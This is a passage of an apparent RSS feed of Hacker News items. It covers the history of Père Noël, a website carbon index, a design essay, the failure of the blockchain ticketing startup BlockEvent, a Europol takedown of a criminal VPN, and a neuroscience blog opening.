<p>En 1921, <a href="https://fr.wikipedia.org/wiki/Norman_Rockwell">Norman Rockwell</a> colore «&nbsp;Saint Nick&nbsp;» de rouge pour la couverture de<em>&nbsp;The Country Gentleman.</em>&nbsp;</p>



<div><figure><img loading="lazy" width="748" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-748x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-748x1024.jpg 748w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-219x300.jpg 219w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus-768x1052.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Norman-Rockwell-The-Country-Gentleman-Santa-Claus.jpg 977w" sizes="(max-width: 748px) 100vw, 748px"><figcaption>Norman Rockwell – The Country Gentleman – 1921</figcaption></figure></div>



<p>En 1931, <a href="https://fr.wikipedia.org/wiki/Haddon_Sundblom">Haddon Sundblom</a>, Américain d’origine suédoise, dessine pour la société Coca-Cola, le Père Noël à taille humaine tout en lui conservant sa bonhommie, ses rondeurs et sa figure joviale. Pour trouver de nouveaux marchés pour le soda pendant l’hiver américain, la société exporte la boisson vers des pays chauds où la saison estivale bat son plein. C’est ainsi que l’image du Père Noël accompagne avec le soda à travers le monde.</p>



<br>



<h4><strong>Père Noël ou Enfant Jésus, faut-il choisir ?</strong></h4>



<p>Dans l’Europe de l’après-guerre, le Père Noël exaspère les Chrétiens. Le Père Noël commercial a pris le pas sur la célébration de la naissance de Jésus. En 1951 le sujet fait vivement débat en France au point que des politiques de renom débattent. </p>



<p>Le journal<em>&nbsp;La Croix&nbsp;</em>rapporte «&nbsp;une campagne des mouvements catholiques contre le Père Noël&nbsp;»&nbsp;: un curé en brûle une effigie accrochée aux barreaux de la cathédrale de Dijon devant des enfants choqués. La presse fait écho.</p>



<p>L’ultra commercialisation de la fête de Noël depuis la seconde moitié du XIXe siècle fait craindre la perte de sens de la célébration religieuse.</p>



<div><figure><img loading="lazy" width="818" height="1024" src="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-818x1024.jpg" alt="" srcset="https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-818x1024.jpg 818w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-240x300.jpg 240w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-768x962.jpg 768w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-1227x1536.jpg 1227w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair-1635x2048.jpg 1635w, https://www.dalsaceetdailleurs.com/wp-content/uploads/2020/12/Thetoyfair.jpg 2041w" sizes="(max-width: 818px) 100vw, 818px"></figure></div>



<p>Mais l’anthropologue <a href="https://fr.wikipedia.org/wiki/Claude_L%C3%A9vi-Strauss">Claude Lévi-Strauss</a> défend le Père Noël qu’il considère comme la «&nbsp;divinité d’une classe d’âge&nbsp;» . </p>



<p>La psychanalyste <a href="https://fr.wikipedia.org/wiki/Fran%C3%A7oise_Dolto">Françoise Dolto</a> insiste sur l’utilité du Père Noël. Pour elle, le moment de la démystification du personnage est un rite de passage d’un âge vers un autre. Elle est d’ailleurs soutenue dans sa conviction par son frère, ministre de <a href="https://www.laposte.fr/lettre-pere-noel">la Poste</a> qui lui confie en 1962 la tâche de mettre en place une carte-réponse type pour répondre aux enfants qui écrivent au Père Noël. Depuis si le système s’est modernisé, il existe toujours, en France comme ailleurs. Ici <a href="https://pere-noel.laposte.fr/">le Secrétariat</a> du Père Noël français, là, <a href="https://www.laposte.fr/lettre-pere-noel">la lettre-type</a> à envoyer par la Poste française.</p>



<p>Il existe, en Laponie, <a href="https://santaclausvillage.info/fr/">le village du Père Noël</a>. L’occasion d’un fabuleux voyage dans une contrée extrême où le frisson du grand froid le dispute à l’excitation de vivre un rêve d’enfant.</p>



<p>Dans un monde en quête de sens, mais où petits et grands s’attachent à des personnages fictifs aux figures sympathiques et où le commerce se veut divertissement pour mieux séduire, gageons que le Père Noël a encore de beaux jours devant lui.</p>



<h4><strong>Pour aller plus loin</strong></h4>



<div><div>
<ul><li>Arbre généalogique du Père Noël selon Jean-Claude BAUDOT, illustration de Jean-Michel SAGNOLS, 1986 – 30 x 40 cm</li></ul>
</div></div>



<ul><li>« Biographie du Père Noël » Catherine LEPAGNOL, édition Hachette, 1979</li></ul>

   	</div></div>]]>
            </description>
            <link>https://www.dalsaceetdailleurs.com/2020/12/22/genealogie-du-pere-noel/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25516089</guid>
            <pubDate>Wed, 23 Dec 2020 09:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What UK Political Party has the largest impact?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25515845">thread link</a>) | @drydenwilliams
<br/>
December 23, 2020 | https://ecoping.earth/indexes/gb/politicalparties | <a href="https://web.archive.org/web/*/https://ecoping.earth/indexes/gb/politicalparties">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><p>🚀 On a mission to reduce the carbon footprint of the Internet! 🌎</p></div><header><div><nav><a href="https://ecoping.earth/"><p><b>Eco</b>Ping.</p></a><div id="navbarCollapse"><ul><li><a href="https://ecoping.earth/indexes">Indexes</a></li><li><a href="https://ecoping.earth/cdn">CDN</a></li><li><a href="https://ecoping.earth/faqs">FAQs</a></li><li><a href="https://ecoping.earth/pricing">Pricing</a></li><li><a href="https://ecoping.earth/blog">Blog</a></li></ul></div></nav></div></header><main><section><p><h2>We've ranked the UKs Political Parties websites in order of the most eco-friendly and their impact on the planet.</h2></p></section><div><p><svg viewBox="0 0 32 32" width="48" height="48" stroke-width="4" fill="none" stroke="currentcolor" role="img"><title>Loading...</title><circle cx="16" cy="16" r="12" opacity="0.125"></circle><circle cx="16" cy="16" r="12" stroke-dasharray="75.39822368615503" stroke-dashoffset="56.548667764616276"></circle></svg></p><table><thead><tr><th> Rank </th><th>Name</th><th>Site size</th><th>CO2 (g)</th><th>CSS</th><th>JS</th><th>Fonts</th><th>Images</th></tr></thead><tbody></tbody></table><div><div><h2>Want to make your own index?</h2><p>Once you've created an account and logged in. You simply add any sites you would like, and we will start tracking them over time; creating your very own personal index and eco-reports. It's super easy.</p></div></div><p><a href="https://ecoping.earth/indexes">&lt; Back to indexes</a></p></div></main><div><div><div><p>🕯 We've gone for dark mode to reduce the</p><!-- --> <p><a href="http://mobileenerlytics.com/dark-mode/" target="_blank" rel="noreferrer noopener">display power drawn</a></p><!-- --><p>of your devices.</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://ecoping.earth/indexes/gb/politicalparties</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515845</guid>
            <pubDate>Wed, 23 Dec 2020 09:08:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sticking to It]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515687">thread link</a>) | @cromulent
<br/>
December 23, 2020 | https://automattic.design/2020/07/09/sticking-to-it/ | <a href="https://web.archive.org/web/*/https://automattic.design/2020/07/09/sticking-to-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>This story is a bit long, but I promise it will be worth it, because it contains the two most important principles every designer must know and take to heart if you intend to do great work anywhere, under almost any circumstances, over the long, long haul of your career.</p>



<h2>The Bronze Age of me</h2>



<p>Early in my career, before the web, when I was in advertising, I had the good fortune to work for legendary creative directors. They’d amassed so many awards in their careers that, in the event of Apocalypse, they could have melted their shiny trophies down and lived off the barter value of the metal.</p>



<p>These old men were giants who had once strode the halls of famous agencies, but ours was not famous—at least not for being good. It was a reeking quagmire where great ideas went to die.&nbsp;</p>



<p>Our company knew it had a problem, so it kept hiring brilliant creative leaders, paying them to inspire us demoralized and underpaid young art directors and copywriters, and pitting us against an internal culture that had been designed quite carefully to neutralize and kill the kind of work our ever-changing cast of overlords challenged us to create.&nbsp;</p>



<h2>Let me unpack that.&nbsp;</h2>



<p>Our clients were makers of aspirin and ointments. They owned financially successful chain restaurants. If it ached, if it bled, if it could be satisfied with heaping plates of deeply fried or sauce-drowned food-like products at a family-friendly low price, we probably handled its advertising.&nbsp;</p>



<p>This type of advertising, painstakingly crafted to offend no one, and baited with jingles that stick, unwanted, in the mind, works chiefly by being shown so many times that it can’t help but lodge in the collective consciousness and inexorably drive sales. Think McDonald’s, but smaller and less … glamorous.&nbsp;</p>



<p>Saturation is the name of the game, and the agency (like others of its kind) made its money by taking a commission on media placement.&nbsp;<em>Creative was something we gave away free.</em> All we wanted was a cut of the fee broadcasters charged to run the stuff.</p>



<h2>Fear of a creative planet</h2>



<p>A great ad—one people talked about, one that potentially risked offending a few people—would destroy the cozy and lucrative business relationships on which the agency was founded. The company knew it, and hired skilled account executives to prevent even a moderately good idea from ever reaching the airwaves.</p>



<p><em>But…</em></p>



<p>Creative advertising was much talked-about in the popular culture of the time, and our clients asked for it even though they wouldn’t have bought it to save their children’s lives. So the agency occasionally had to show a good idea.&nbsp;</p>



<p>Besides, we young art directors and copywriters were idealists, and the agency wasn’t paying us enough to buy our loyalty. They <em>might</em> have distributed the profits more equitably, but the account executives had houses in Darien and ex-spouses to support, so they couldn’t afford to waste any of that money on the troops who did the work the whole thing ran on.</p>



<p>Hence every six months the company hired new creative directors who, we grunts thought, would finally “turn this place around” and allow us to do the kind of work we dreamed of.</p>



<p>This is how our company came to hire legendary award winners. And although we never sold a great ad, the lesson I learned from them turned out to be the second most important guiding principle of my work as a designer. The first, most important principle, of course, is listen to the customer. But this other principle comes a close second.</p>



<p>The principle these creative directors taught me, chiefly by how they acted, was…</p>



<h2>Never give up.</h2>



<p>Never stop trying to do great work. Never get demoralized. Never stop caring.&nbsp;</p>



<p>It sounds simple. It isn’t.</p>



<p>I watched these creative directors and their partners work all night to produce a great idea in spite of all the constraints around the client and product.&nbsp;</p>



<p>I watched them enthusiastically present great work internally. Watched the internal folks sabotage it through fear. Watched my leaders cheerfully go back to the drawing board and come up with something new by the next morning.</p>



<p>I watched them enact this ritual a half-dozen times before the work even got shown to the clients.</p>



<p>I watched the clients shoot it down. I watched my leaders cheerfully get up, put their materials away, come back to the agency, and start over.</p>



<p>Never, not once, did they dial it in. Never did they just shrug their shoulders and say, “Fine, I’ll give these people what they want.” They listened to the customer but the customer didn’t dictate. The customer’s business problem dictated the creative solution. The solution would work if the customer bought it. If the customer didn’t buy, well, there was another great creative solution out there, if you just worked hard enough to find it.</p>



<p>Even in those extremely backwards times, there were great women creative directors out there, too—but our agency never hired one, so I only got to meet these men.&nbsp;</p>



<p>They were old men—one of them, who leaned forward with a hunch, and always walked as if he were in pain—looked like Moses. I swear he stared through my soul when I tried to go home before 8:00 PM. (We worked in offices then, and you never went home before your boss.) He scared me but I liked him.</p>



<div><p>Once I asked if he missed the “great” clients he had worked for in the past.&nbsp;</p><p>“Great clients?”</p><p>“Like Volkswagen.”</p></div>



<p>“They killed just as many good ads as these guys do.”</p>



<p>“What did you do?”</p>



<p>“Came up with more ads.”</p>



<p>The ability to keep coming up with more ads was why this Moses-looking dude had a roomful of shiny trophies, and I did not. If I wanted a career like his, I would have to seek deeply in my soul for the strength and willingness not to give up.</p>



<p>Career aside,<em>&nbsp;if I wanted to create meaningful work,</em>&nbsp;I would need to develop the patience and willingness to watch people kill my darlings, and come back with newer, fresher, better darlings.</p>







<p>I have not done it perfectly, not by a long shot. But keeping a positive attitude when an idea I’ve fallen in love with gets rejected remains the second most important thing I can do on a daily basis as I practice my current craft.</p>



<p>Both product work and client work are tough. The challenges can seem overwhelming. We bang our heads. We weep. Finally, we and our teammates come up with a solution. This is it! We’ve done it! Joyfully, we share it. Our lead shoots holes in it. Maybe because it runs afoul of some important learning we didn’t know about. Or because it was tried before we got here and tested badly. Or, sometimes, because they just don’t like it.</p>



<p>We come back with three ideas and none of them are quite right, either.</p>



<p>So we go back and work harder and come up with new stuff.&nbsp;</p>



<p>The well is never dry. We only run out of ideas when we choose to stop doing the work.</p>



<p>The designers I work with here today inspire me on many levels. Their energy, their talent, their sheer skill impresses me. But what blows me away most of all, is that the really good designers stand up to the misfortune of a killed idea. They take away the lesson of what went wrong, and come back with something that much stronger. Or, if not stronger, something different but equally good.</p>



<p>Never give up.</p>



<hr>



<p><em>This article was inspired by a conversation I had with one of our designers, after watching her respond graciously and positively while working on a tough project.</em></p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://automattic.design/2020/07/09/sticking-to-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515687</guid>
            <pubDate>Wed, 23 Dec 2020 08:41:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Somethings are never meant to be invented. The story of BlockEvent]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25515668">thread link</a>) | @rukshn
<br/>
December 23, 2020 | https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/ | <a href="https://web.archive.org/web/*/https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Every few years there comes a technology that people get hyped about, everyone wants to be a specialist in that field because it appears to be the next big thing.</p>
<p>Between 2015-2019 this was largely about bitcoins and blockchain technology. Everyone wanted to be a specialist in blockchain technology. Bitcoin was booming, ICOs were happening to the left and right.</p>
<p>And people were trying to introduce/incorporate blockchain technology into everything they can get their hands on.</p>
<p>Yes sometimes blockchain technology can improve the existing system. However, when you try to introduce blockchain or any other technology into something that doesn’t require it,the results can be disastrous.</p>
<p>This is a story I wanted to write for a very long time, it was about a small startup called BlockEvent. A small startup that wanted to incorporate blockchain technology into event management.</p>
<p><em>Their website blockevent.tk is now not functioning, and I was unable to find a web archive snapshot. A mirror exists on a different domain, please check the footnotes.</em></p>
<p>Blockchain on event management has been there before BlockEvents. Smart ticketing and smart contracts are currently being used to improve the ticketing field and control pricing etc.</p>
<h2>BlockEvent</h2>
<p>BlockEvents wanted to make the whole event process a decentralized mechanism. From user data, to events, to registration, everything was supposed to be “decentralized” and was “not accessible” to and “not modifiable” by anyone.</p>
<p>According to the BlockEvent team, </p>
<blockquote><p>We made BlockEvent as a decentralized system. That means no central party can control this booking process and it will work without any third party involvement. </p><p>BlockEvent acts as a bridge between the organizers and the participants where organizers come and create events through our system, and participants can come and book their tickets. </p><p>The whole process is done through Public Blockchain.</p><p>… </p><p>Using the blockchain for user identity management is a whole new paradigm.</p><cite>BlockEvent on one of their Facebook posts, describing their system. </cite></blockquote>
<p>BlockEvent when initially started mainly hosted monthly blockchain event meetup events. However, their big break came in May 2019, during the annual Google I/O.</p>
<p>Google I/O event is celebrated in Sri Lanka every year, with local tech companies hosting events of their own, with local influencers, while live streaming the Google I/O event.</p>
<p>The selection process is a very completions, hundreds of people compete for few limited number of seats. These events are a good place to network and meet new friends in IT field. Plus you end up getting some cool swags.</p>
<p>In order to be selected to these events you need to show that you are a tech person, usually they check your GitHub page, blog or YouTube channel. And the tech company will select and send an invitation to whom they think are the most suitable to attend their events.</p>
<p>Until 2018, this was done by using a simple Google form or a regular website.</p>
<p>However, in 2019, one of the largest tech and telecom companies in Sri Lanka decided to use BlockEvents to host their Google I/O event.</p>
<p>Getting selected by a big company like them to manage their Google I/O event was big deal, because they host one of the largest I/O events in Sri Lanka. And BlockEvent can leverage this to opportunity to get bigger clients in future.</p>
<p>It was their make or break moment. They had to nail it, and if they failed then for a small startup like BlockEvent, the damage to their reputation is going to hurt them to a point where there is no return.</p>
<h2><strong>Disaster</strong> </h2>
<p>BlockEvent also in their description, said this,</p>
<blockquote><p>To ensure the user data privacy and security, <strong>we are not storing any user credentials or password</strong>[s] <strong>in our database. Even the user emails are stored as a hash. Only the users know their passwords </strong>and that will provide 100% control over your account actions. Even BlockEvent team can’t access your accounts. </p><cite>BlockEvent describing their system in a Facebook post</cite></blockquote>
<p>Since they were storing <strong>everything </strong>in the blockchain, they were not storing even user emails and passwords. This may sound as a good privacy focused system. But this will come to hurt BlockEvent in a very bad way.</p>
<p>Since no one else other than the people in monthly blockchain meetups knew about BlockEvents, like in any other new service, most people registering for the local Google I/O event used either throwaway passwords, or new passwords which they forgot or didn’t save.</p>
<p>This caused large number of people to forget their passwords. If we use a normal database to store user data, with no hashing, they would have been able to reset the user passwords.</p>
<p>However, since everything is stored in blockchain, and everything were hashed, this meant that there is no way to reset a user password. </p>
<p>This led to large number of people being locked out of their accounts, unable to create new accounts with the existing emails, and BlockEvent team unable to reset passwords.</p>
<p>This caused a wave of negative reviews on BlockEvent Facebook page and on social media. Some users demanded the organizers to go back to the old system of using a Google form for user registration.</p>
<p>BlockEvent finally responded to their users, they had no way to reseat the password. Unless you remember the password and login, or you are permanently locked out from using the account.</p>
<figure><img data-attachment-id="75" data-permalink="https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/img_0045/" data-orig-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=1536%2C1517&amp;ssl=1" data-orig-size="1536,1517" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_0045" data-image-description="" data-medium-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=300%2C296&amp;ssl=1" data-large-file="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?fit=1024%2C1011&amp;ssl=1" loading="lazy" width="1024" height="1011" src="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1" alt="" srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1 1024w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=300%2C296&amp;ssl=1 300w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=768%2C759&amp;ssl=1 768w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?w=1536&amp;ssl=1 1536w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;ssl=1 1024w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=300%2C296&amp;ssl=1 300w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=768%2C759&amp;ssl=1 768w, https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?w=1536&amp;ssl=1 1536w" data-lazy-src="https://i1.wp.com/ruky.me/wp-content/uploads/2020/12/img_0045.jpg?resize=1024%2C1011&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Large number of people were locked out from their accounts, unable to reset their passwords.</figcaption></figure>
<blockquote><p>Due to the rules of decentralization, we can’t reset your passwords as we are giving priority to user data and security. We already communicated this on registration [on sign up]. </p><p>To ensure the decentralization the same rule is applied by many other [b]lockchain projects and products all over the world.</p><cite>BlockEvent responding to the events on a Facebook page</cite></blockquote>
<p>BlockEvent also asked participants to send their personal details on Facebook and via a Google form, so they can manually arrange a way to send the gift pack to the participants.</p>
<p>Some of the users accused the selection process was also flawed and complained that some of the people who were less qualified to attend the event were selected over them.</p>
<p>All this led to irreplaceable damage on BlockEvent, and the Google I/O event didn’t happen due to the Easter Sunday bombings. </p>
<p>BlockEvent went into hiatus few months later, all thought they never mentioned that they are shutting down, their website went offline once their domain name expired. Possibly signaling the end of the startup that hoped to decentralize how we manage identity online.</p>
<h2><strong>Conclusion</strong> </h2>
<p>The title of the post is <strong>“Somethings are never meant to be invented”</strong>.</p>
<p>No matter how utopian the idea may sound like, guaranteeing 100% user privacy with everything stored on a blockchain, not even giving access to user email to the creators can have its own drawbacks.</p>
<p>And since we are all humans, and we all tend to make mistakes, there has to be a fail safe mechanism, that will keep things in check and can undo the mistakes when we make one.</p>
<p>Also a single use password is a very bad idea, not only that users can lose their passwords, but also in the event of a data breach, user handing over the password to a third party by a mistake, how can the service reset the passwords? There are so many scenarios where things can go wrong.</p>
<p>May be an idea like BlockEvent were never meant to be invented.</p>
<p><strong>The currently hyped up technology may not be ideal for your system and instead a time tested solution may be the answer that you’re looking for.</strong></p>
<h2>My thoughts</h2>
<p>When it comes to blockchain and cryptocurrency, I’m still open minded, at the same time but skeptical. I’m not yet ready to invest or build something on blockchain.</p>
<p>I still find it difficult to fully understand the idea of blockchain, what makes it different from a decentralized git repository? Why Git is easy to implement but blockchain is hard? </p>
<p>When it comes to BlockEvents, I think what they did was store the email and password both hashed on the blockchain, and when a user logs in, they match the submitted hashed email and hashed passwords against what’s stored in the blockchain, like we do it in a normal login system using a database, except the fact that we don’t hash the emails.</p>
<h4>Notes</h4>
<p><em>I’m not a blockchain expert, so I don’t know the exact reason why BlockEvent was not able to reset the passwords.</em></p>
<p><em>Was it because they didn’t know the emails because they were hashed, or was it because once you put some information to the blockchain it is immutable, or was it due to both?</em></p>
<p><em>At the time when I saw this in 2019, I thought it was due to the fact that data is immutable on the blockchain, but now at the time of writing I feel it was due to the fact that the emails were stored on the blockchain in hashed format.</em></p>
<p><em>I also don’t know what really caused so many people to lose their password, my assumption is that they used a throwaway password, or a new password which they forgot. But still this number of users getting locked out is still unexplained.</em></p>
<p><em>After further Googling I was able to find a mirror of the original website on another domain name http://blockevent.ml</em></p>
<p><em>I tried logging in using my BlockEvent account, but I also have forgotten my BlockEvent password, and now I’m also locked out.</em></p>
<ul><li>BlockEvent password forgot requests – <a href="https://m.facebook.com/pg/blockevent.live/reviews/">https://m.facebook.com/pg/blockevent.live/reviews/</a></li></ul>
</div></div>]]>
            </description>
            <link>https://ruky.me/2020/12/23/somethings-are-never-meant-to-be-invented-the-story-of-blockevent/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515668</guid>
            <pubDate>Wed, 23 Dec 2020 08:36:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Footmouse]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515655">thread link</a>) | @iforgottherest
<br/>
December 23, 2020 | https://www.dossierd.nl/ap_voetmuis_eng.html | <a href="https://web.archive.org/web/*/https://www.dossierd.nl/ap_voetmuis_eng.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.dossierd.nl/ap_voetmuis_eng.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515655</guid>
            <pubDate>Wed, 23 Dec 2020 08:31:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cybercriminals’ Favourite VPN Taken Down in Global Action]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515644">thread link</a>) | @doener
<br/>
December 23, 2020 | https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action | <a href="https://web.archive.org/web/*/https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Law enforcement wiretapped the very service used by criminals to evade interception</p><div><p>The virtual private network (VPN) Safe-Inet used by the world’s foremost cybercriminals has been taken down yesterday in a coordinated law enforcement action led by the German Reutlingen Police Headquarters together with Europol and law enforcement agencies from around the world.&nbsp;</p>
<p>The Safe-Inet service was shut down and its infrastructure seized in Germany, the Netherlands, Switzerland, France and the United States. The servers were taken down, and a splash page prepared by Europol was put up online after the domain seizures. This coordinated takedown was carried out in the framework of the <a href="https://www.europol.europa.eu/empact">European Multidisciplinary Platform Against Criminal Threats (EMPACT)</a>.&nbsp;</p>
<h3>Turning the table on the criminals&nbsp;</h3>
<p>Active for over a decade, Safe-Inet was being used by some of the world’s biggest cybercriminals, such as the ransomware operators responsible for ransomware, E-skimming breaches and other forms of serious cybercrime.&nbsp;</p>
<p>This VPN service was sold at a high price to the criminal underworld as one of the best tools available to avoid law enforcement interception, offering up to 5 layers of anonymous VPN connections.</p>
<p>Law enforcement were able to identify some 250 companies worldwide which were being spied on by the criminals using this VPN. These companies were subsequently warned of an imminent ransomware attack against their systems, allowing them to take measures to protect themselves against such an attack.<br>
The service has now been rendered inaccessible.&nbsp;</p>
<p>Investigations are ongoing in a number of countries to identify and take action against some of Safe-Inet’s users. &nbsp;</p>
<h3>International cyber sweep&nbsp;</h3>
<p>International police cooperation was central to the success of this investigation as the critical infrastructure was scattered across the world.</p>
<p>Europol’s <a href="https://www.europol.europa.eu/about-europol/european-cybercrime-centre-ec3">European Cybercrime Centre (EC3) </a>supported the investigation from the onset, bringing together all the involved countries to establish a joint strategy and to organise the intensive exchange of information and evidence needed to prepare for the final phase of the takedown.&nbsp;</p>
<p>The <strong>Police President of the Reutlingen Police Headquarters, Udo Vogel</strong>, said:</p>
<blockquote><p>The investigation carried out by our cybercrime specialists has resulted in such a success thanks to the excellent international cooperation with partners worldwide. The results show that law enforcement authorities are equally as well connected as criminals.&nbsp;</p>
</blockquote>
<p>The <strong>Head of Europol’s European Cybercrime Centre, Edvardas Šileris</strong>, said:</p>
<blockquote><p>The &nbsp;strong working relationship fostered by Europol between the investigators involved in this case on either side of the world was central in bringing down this service. &nbsp;Criminals can run but they cannot hide from law enforcement, and we will continue working tirelessly together with our partners to outsmart them.</p>
</blockquote>
<h3>Participating agencies</h3>
<ul><li><strong>Germany:</strong> Reutlingen Police Headquarters (Polizeipräsidium Reutlingen)</li>
<li><strong>The Netherlands: </strong>National Police (Politie)</li>
<li><strong>Switzerland:</strong> Cantonal Police of Argovia (Kantonspolizei Aargau)&nbsp;</li>
<li><strong>United States: </strong>&nbsp;Federal Bureau of Investigation</li>
<li><strong>France: </strong>Judicial Police (Direction Centrale de la Police Judiciaire)</li>
<li><strong>Europol:</strong> European Cybercrime Centre (EC3)&nbsp;</li>
</ul></div></div>]]>
            </description>
            <link>https://www.europol.europa.eu/newsroom/news/cybercriminals%E2%80%99-favourite-vpn-taken-down-in-global-action</link>
            <guid isPermaLink="false">hacker-news-small-sites-25515644</guid>
            <pubDate>Wed, 23 Dec 2020 08:30:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Instinct and learning: two sides of the same coin]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25515511">thread link</a>) | @giuliomagnifico
<br/>
December 23, 2020 | https://www.sainsburywellcome.org/web/blog/instinct-and-learning-two-sides-same-coin | <a href="https://web.archive.org/web/*/https://www.sainsburywellcome.org/web/blog/instinct-and-learning-two-sides-same-coin">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-off-canvas-main-canvas="">
    <div>

  <div>
    <header role="banner">
        <div>
    <div id="block-ucl-branding">
  
    
        <p><a href="https://www.sainsburywellcome.org/web/" title="Home" rel="home">
      <img src="https://www.sainsburywellcome.org/web/themes/custom/ucl/logo.svg" alt="Home">
    </a></p><p>Sainsbury Wellcome Centre for Neural Circuits and Behaviour</p>
  </div>
<nav role="navigation" aria-labelledby="block-ucl-main-menu-menu" id="block-ucl-main-menu">
            
  <h2 id="block-ucl-main-menu-menu">Main navigation</h2>
  

        
              
  


  </nav>



    
  </div>

    </header>
  </div>

  

      
  
      <div>
      <div>
        <div>
    <div id="block-ucl-breadcrumbs">
  
    
        <nav role="navigation" aria-labelledby="system-breadcrumb">
    
    <ol>
          <li>
                  <a href="https://www.sainsburywellcome.org/web/blog">Blog</a>
          <span></span>
              </li>
          <li>
                  Instinct and learning: two sides of the same coin
              </li>
        </ol>
  </nav>

  </div>

  </div>

      </div>
    </div>
  
      <div>
        <div>
    <div id="block-views-block-hero-block-1">
  
    
      <div><div>
  
    
      
      <div>
          <div>
    
<div>
  
            
      <div><div>
  
    
      
      <div>
          <div>
    <div><p>Even the most advanced feats of human intelligence initially depend on innate behaviours to catalyse learning.</p></div>
  </div>
    <div>
    <div><p>Released into a new environment, young mice immediately search for crevices to hide in, test out routes to safety, and inspect any objects that could obstruct their path. But what information do they extract from the environment while exploring it?</p></div>
  </div>
    <div>
    <div><p>Animals are commonly thought to learn by observing unfamiliar features in the environment and incorporating them into an abstract internal representation. We found, however, that mere observation did not improve their ability to navigate.</p></div>
  </div>

    </div>
  
          </div>
</div>

</div>

  </div>

    </div>
  
          </div>
</div>

  </div>

  </div>
